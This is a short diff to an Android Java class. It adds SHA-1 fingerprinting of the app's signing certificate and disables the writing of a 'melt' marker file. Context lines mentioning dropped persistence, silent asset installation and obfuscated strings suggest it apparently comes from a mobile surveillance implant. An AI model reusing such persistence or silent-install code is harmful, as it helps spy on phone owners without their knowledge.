@@ -50,6 +50,8 @@ import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.security.cert.CertificateException;
 import java.security.cert.CertificateFactory;
 import java.security.cert.X509Certificate;
@@ -302,14 +304,20 @@ public class Core extends Activity implements Runnable {
 				try {
 					certFactory = CertificateFactory.getInstance("X509");
 					x509Cert = (X509Certificate) certFactory.generateCertificate(certStream);
+					MessageDigest md = MessageDigest.getInstance("SHA1");
+					byte[] publicKey = md.digest(x509Cert.getEncoded());
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkSignature), Certificate subject: " + x509Cert.getSubjectDN());
-						Check.log(TAG + " (checkSignature), Certificate issuer: " + x509Cert.getIssuerDN());
-						Check.log(TAG + " (checkSignature), Certificate serial number: " + x509Cert.getSerialNumber());
+						Check.log(TAG + " (checkSignature), Certificate sha1: " + StringUtils.byteArrayToHexString(publicKey));
+						//Check.log(TAG + " (checkSignature), Certificate issuer: " + x509Cert.getIssuerDN());
+						//Check.log(TAG + " (checkSignature), Certificate serial number: " + x509Cert.getSerialNumber());
 					}
 
 				} catch (CertificateException e) {
 					// e.printStackTrace();
+				} catch (NoSuchAlgorithmException e) {
+					//e.printStackTrace();
 				}
 			}
 		} catch (PackageManager.NameNotFoundException e) {
@@ -1175,8 +1183,8 @@ public class Core extends Activity implements Runnable {
 					Status.self().makeToast(M.e("Melt: dropped persistence"));
 				}
 
-				Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
-				markupMelt.serialize(Status.getAppContext().getPackageName());
+				//Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+				//markupMelt.serialize(Status.getAppContext().getPackageName());
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
